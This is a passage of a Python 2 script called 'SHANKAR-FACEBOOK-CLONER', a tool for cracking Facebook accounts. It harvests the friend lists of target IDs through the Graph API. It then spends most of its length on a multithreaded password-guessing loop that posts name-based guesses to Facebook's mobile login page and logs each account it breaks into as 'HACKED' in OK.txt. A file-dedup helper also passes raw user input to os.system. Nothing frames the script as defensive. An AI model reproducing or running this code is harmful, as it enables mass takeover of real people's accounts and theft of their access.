                                                                    print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps14 + '\x1b[0;97m'
                                                                    cp = open('CP.txt', 'a')
                                                                    cp.write(uid + '|' + ps14 + '\n')
                                                                    cp.close()
                                                                    cps.append(uid + ps14)
                                                                else:
                                                                    data = session.post('https://mbasic.facebook.com/login.php', data = {
                                                                        'email': uid,
                                                                        'pass': ps15,
                                                                        'login': 'submit' })
                                                                    sp = data.content
                                                                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                                                        print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps15 + '\x1b[0;97m'
                                                                        ok = open('OK.txt', 'a')
                                                                        ok.write(uid + '|' + ps15 + '\n')
                                                                        ok.close()
                                                                        oks.append(uid + ps15)
                                                                    elif 'checkpoint' in sp:
                                                                        print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps15 + '\x1b[0;97m'
                                                                        cp = open('CP.txt', 'a')
                                                                        cp.write(uid + '|' + ps15 + '\n')
                                                                        cp.close()
                                                                        cps.append(uid + ps15)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m======================================================='
    print '\x1b[1;37m[=] PROCESS HAS BEEN COMPLETE'
    print '\x1b[1;37m[=] TOTAL OK : \x1b[1;32m' + str(len(oks))
    print '\x1b[1;37m[=] TOTAL CP : \x1b[1;31m' + str(len(cps))
    print '\x1b[1;97m======================================================='
    raw_input('\x1b[1;37mPRESS ENTER TO BACK MENU ')
    menu()


def sing():
    global token
    os.system('clear')
    
    try:
        token = open('shankar_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found'
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\t     CRACK WITH SINGLE PASS'
    print '\x1b[1;97m======================================================='
    print '[1] CRACK PUBLIC ID'
    print '[2] CRACK FOLLOWERS'
    print '[3] CRACK MULTIPLE ID'
    print '[4] FILE CLONING'
    print '[0] BACK'
    print '\x1b[1;97m======================================================='
    digit_rx()


def digit_rx():
    rx = raw_input('[?] Choose : ')
    id = []
    oks = []
    cps = []
    if rx == '1':
        os.system('clear')
        print logo
        print '\t     SINGLE PASS CRACKING'
        print '\x1b[1;37m======================================================='
        idt = raw_input('[?] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\t     SINGLE PASS CRACKING'
            print '\x1b[1;97m======================================================='
            print '[+] CLONING FROM : \x1b[1;92m' + q['name']
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif rx == '2':
        os.system('clear')
        print logo
        print '\t     SINGLE PASS CRACKING'
        print '\x1b[1;97m======================================================='
        idt = raw_input('[?] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\t     SINGLE PASS CRACKING'
            print '\x1b[1;97m======================================================='
            print '[+] CLONING FROM : \x1b[1;92m' + q['name']
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif rx == '4':
        os.system('clear')
        print logo
        print '\t     SINGLE PASS FILE CRACK'
        print '\x1b[1;97m======================================================='
        
        try:
            filelist = raw_input('[?] INPUT FILE NAME : \x1b[1;92m')
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())
        except (KeyError, IOError):
            print '\t    \x1b[1;38mRequested file not found\x1b[0;98m'
            raw_input(' Press enter to back ')
            choice()
        

    if rx == '3':
        os.system('clear')
        print logo
        print '\t     SINGLE PASS CRACKING'
        print '\x1b[1;37m======================================================='
        idt = raw_input('[1] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[2] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[3] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[4] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif rx == '0':
        menu()
    else:
        print ''
        print '\tSELECT VALID OPTION'
        print ''
        choice()
    print '\x1b[1;97m[=] TOTAL IDS :\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m[=] THE PROCESS HAS STARTED'
    print '\x1b[1;97m======================================================='
    print '\x1b[1;93m     SHANKAR-FACEBOOK-CLONER'
    print '\x1b[1;97m=======================================================-'
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        sharagent = random.choice(sua)
        session = requests.Session()
        session.headers.update({
            'Host': 'mbasic.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'user-agent': sharagent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
        host = 'https://mbasic.facebook.com'
        
        try:
            ps = name
            data = session.post('https://mbasic.facebook.com/login.php', data = {
                'email': uid,
                'pass': ps,
                'login': 'submit' })
            sp = data.content
            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps + '\x1b[0;97m'
                ok = open('OK.txt', 'a')
                ok.write(uid + '|' + ps + '\n')
                ok.close()
                oks.append(uid + ps)
            elif 'checkpoint' in sp:
                print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps + '\x1b[0;97m'
                cp = open('CP.txt', 'a')
                cp.write(uid + '|' + ps + '\n')
                cp.close()
                cps.append(uid + ps)
            else:
                ps2 = name.lower().split(' ')[0] + ' ' + name.lower().split(' ')[1]
                data = session.post('https://mbasic.facebook.com/login.php', data = {
                    'email': uid,
                    'pass': ps2,
                    'login': 'submit' })
                sp = data.content
                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                    print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps2 + '\x1b[0;97m'
                    ok = open('OK.txt', 'a')
                    ok.write(uid + '|' + ps2 + '\n')
                    ok.close()
                    oks.append(uid + ps2)
                elif 'checkpoint' in sp:
                    print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps2 + '\x1b[0;97m'
                    cp = open('CP.txt', 'a')
                    cp.write(uid + '|' + ps2 + '\n')
                    cp.close()
                    cps.append(uid + ps2)
        except:
            pass


    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m======================================================='
    print '\x1b[1;37m[=] PROCESS HAS BEEN COMPLETE'
    print '\x1b[1;37m[=] TOTAL OK : \x1b[1;32m' + str(len(oks))
    print '\x1b[1;37m[=] TOTAL CP : \x1b[1;31m' + str(len(cps))
    print '\x1b[1;97m======================================================='
    raw_input('\x1b[1;37mPRESS ENTER TO BACK MENU ')
    menu()


def cutter():
    os.system('clear')
    print logo
    print '\t\x1b[1;37mINPUT FILE REMOVE DOUBLING (/sdcard/xx.txt) '.center(50)
    print '\x1b[1;97m======================================================='
    st = raw_input('[?] INPUT FILE NAME : \x1b[1;32m')
    os.system('clear')
    print logo
    print '\x1b[1;37m[?] PUT FILE REMOVED ID OUTPUT (/sdcard/xx.txt) '.center(50)
    print '\x1b[1;97m======================================================='
    fp = raw_input('\x1b[1;37mOUTPUT NEW FILE NAME : \x1b[0;97m')
    os.system('sort -r ' + st + ' | uniq > ' + fp)
    os.system('clear')
    print logo
    print '\x1b[1;32mREMOVED DOUBLING SUCCESSFULL :) '.center(50)
    print ('\x1b[1;32mFile Save In /sdcard/' + fp).center(50)
    print '\x1b[1;97m======================================================='
    raw_input('PRESS ENTER TO BACK ')
    menu()

if __name__ == '__main__':
    token()
